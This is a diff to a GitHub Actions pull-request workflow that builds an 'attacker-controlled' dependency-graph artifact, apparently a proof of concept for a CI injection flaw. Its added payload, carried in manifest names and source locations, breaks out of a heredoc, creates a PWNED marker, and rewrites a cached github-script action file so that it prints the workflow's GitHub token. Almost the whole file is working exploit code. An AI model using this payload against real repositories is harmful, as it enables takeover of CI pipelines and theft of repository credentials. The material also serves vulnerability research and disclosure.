@@ -2,6 +2,7 @@ name: PR Workflow
 
 on:
   pull_request:
+    branches: [main]
 
 jobs:
   depgraph:
@@ -9,28 +10,43 @@ jobs:
     steps:
       - name: Create attacker-controlled dependency graph artifact
         run: |
-          mkdir -p out
+          mkdir -p dependency-graph-reports/dependency-graph-reports
           python3 - <<'PY'
           import json
+          payload = (
+              "attacker-manifest\n"
+              "EOF\n"
+              "echo GAB_INJECTED_MARKER_OK\n"
+              "touch PWNED\n"
+              "printf '%s\\n' 'process.stdout.write(\"LEAKED_TOKEN:\"+process.env[\"INPUT_GITHUB-TOKEN\"]+\"\\n\")' >> \"$GITHUB_WORKSPACE/../../_actions/actions/github-script/3a2844b7e9c422d3c10d287c895573f7108da1b3/dist/index.js\"\n"
+              "exit 0 #"
+          )
           snap = {
             "version": 0,
             "sha": "${{ github.event.pull_request.head.sha }}",
             "ref": "refs/pull/${{ github.event.pull_request.number }}/head",
-            "job": {"correlator": "poc", "id": "poc-1"},
+            "job": {"correlator": "poc", "id": "poc-e2e-3"},
             "detector": {"name": "poc", "version": "1.0", "url": "https://example.com"},
             "manifests": {
-              "attacker-manifest\nEOF\nid; touch PWNED; exit 0\n": {
+              payload: {
                 "name": "attacker-manifest",
-                "file": {"source_location": "attacker-manifest"},
-                "resolved": {}
+                "file": {"source_location": payload},
+                "resolved": {
+                  "pkg:npm/gab-poc-evil@2.0.0": {
+                    "package_url": "pkg:npm/gab-poc-evil@2.0.0",
+                    "relationship": "direct",
+                    "scope": "runtime",
+                    "dependencies": []
+                  }
+                }
               }
             },
-            "scanned": {"version": 0}
+            "scanned": "2026-10-30T18:45:00Z"
           }
-          open("out/dep.json","w").write(json.dumps(snap))
+          open("dependency-graph-reports/dependency-graph-reports/dep.json","w").write(json.dumps(snap))
           PY
-          cat out/dep.json
+          cat dependency-graph-reports/dependency-graph-reports/dep.json
       - uses: actions/upload-artifact@v4
         with:
           name: dependency-graph_poc
-          path: out/
+          path: dependency-graph-reports
